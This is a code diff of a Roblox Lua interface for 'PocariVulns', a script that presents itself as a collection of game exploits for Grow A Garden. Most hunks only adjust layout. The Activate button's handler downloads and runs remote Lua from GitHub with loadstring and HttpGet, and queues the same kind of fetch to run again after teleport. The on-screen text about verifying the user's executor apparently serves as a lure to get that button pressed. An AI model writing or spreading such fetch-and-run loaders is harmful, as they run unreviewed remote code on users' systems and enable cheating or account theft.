@@ -268,17 +268,41 @@ contentStroke.Color = Color3.fromRGB(35, 40, 65)
 contentStroke.Thickness = 1
 contentStroke.Parent = contentArea
 
+-- Create scrollable content area
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Name = "ContentScroll"
+scrollFrame.Size = UDim2.new(1, -10, 1, -10)
+scrollFrame.Position = UDim2.new(0, 5, 0, 5)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.ScrollBarThickness = 4
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 80, 120)
+scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scrollFrame.Parent = contentArea
+
+local contentLayout = Instance.new("UIListLayout")
+contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+contentLayout.Padding = UDim.new(0, 10)
+contentLayout.Parent = scrollFrame
+
+local padding = Instance.new("UIPadding")
+padding.PaddingTop = UDim.new(0, 5)
+padding.PaddingLeft = UDim.new(0, 5)
+padding.PaddingRight = UDim.new(0, 5)
+padding.Parent = scrollFrame
+
+-- Main content frame
 local mainContent = Instance.new("Frame")
 mainContent.Name = "MainContent"
-mainContent.Size = UDim2.new(1, -20, 1, -20)
-mainContent.Position = UDim2.new(0, 10, 0, 10)
+mainContent.Size = UDim2.new(1, 0, 0, 0)
+mainContent.AutomaticSize = Enum.AutomaticSize.Y
 mainContent.BackgroundTransparency = 1
-mainContent.Parent = contentArea
+mainContent.LayoutOrder = 1
+mainContent.Parent = scrollFrame
 
 local welcomeLabel = Instance.new("TextLabel")
 welcomeLabel.Name = "WelcomeLabel"
-welcomeLabel.Size = UDim2.new(1, 0, 0.6, 0)
-welcomeLabel.Position = UDim2.new(0, 0, 0, 0)
+welcomeLabel.Size = UDim2.new(1, 0, 0, 0)
+welcomeLabel.AutomaticSize = Enum.AutomaticSize.Y
 welcomeLabel.BackgroundTransparency = 1
 welcomeLabel.Text = "Welcome to PocariVulns!!\n\nThis is compilation of the Vulnerabilities active in Grow A Garden, this is purely for educational purposes only and not intended for harm and misuse.\n\nPlease press the Activate Button below to proceed, this will restart your server to initialize and verify your executor for the use of the scripts."
 welcomeLabel.TextColor3 = Color3.fromRGB(180, 185, 230)
@@ -289,17 +313,25 @@ welcomeLabel.TextXAlignment = Enum.TextXAlignment.Left
 welcomeLabel.TextYAlignment = Enum.TextYAlignment.Top
 welcomeLabel.Parent = mainContent
 
+-- Button container for proper centering
+local buttonContainer = Instance.new("Frame")
+buttonContainer.Name = "ButtonContainer"
+buttonContainer.Size = UDim2.new(1, 0, 0, 40)
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.LayoutOrder = 2
+buttonContainer.Parent = scrollFrame
+
 local activateButton = Instance.new("TextButton")
 activateButton.Name = "ActivateButton"
 activateButton.Size = UDim2.new(0.6, 0, 0, 36)
-activateButton.Position = UDim2.new(0.2, 0, 0.75, 0)
 activateButton.AnchorPoint = Vector2.new(0.5, 0.5)
+activateButton.Position = UDim2.new(0.5, 0, 0.5, 0)
 activateButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
 activateButton.Text = "Activate"
 activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 activateButton.TextSize = 14
 activateButton.Font = Enum.Font.GothamBold
-activateButton.Parent = mainContent
+activateButton.Parent = buttonContainer
 
 local activateButtonCorner = Instance.new("UICorner")
 activateButtonCorner.CornerRadius = UDim.new(0, 8)
@@ -326,6 +358,7 @@ activateButton.MouseButton1Click:Connect(function()
     queue_on_teleport([[
         loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/visual.lua"))()
     ]])
+    task.wait(1)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
     
     local tween = TweenService:Create(activateButton, TweenInfo.new(0.3), {
